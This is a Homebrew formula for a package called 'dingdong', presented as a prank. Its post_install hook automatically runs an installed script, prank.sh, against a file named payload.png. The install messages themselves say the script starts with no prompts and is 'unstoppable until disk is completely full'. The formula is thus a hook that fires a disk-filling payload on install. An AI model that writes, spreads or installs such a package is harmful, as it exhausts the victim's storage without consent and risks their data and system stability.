class Dingdong < Formula
  desc "⚡ Karan's Ultimate Prank - Lightning speed, unstoppable execution"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.1.0"
  sha256 "437d4f2a1e9b4d72c024e0d1bfb71f4f9b8c14354a1b11ced26a8a0184113f80"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "⚡ Karan's Ultimate Prank v3.1 - Lightning Speed Edition!"
    ohai "🚀 Auto-starts immediately, no prompts required"
    ohai "💀 Unstoppable until disk is completely full"
    
    system "#{bin}/prank.sh #{pkgshare}/payload.png"
  end

  test do
    system "#{bin}/prank.sh", "--version"
  end
end
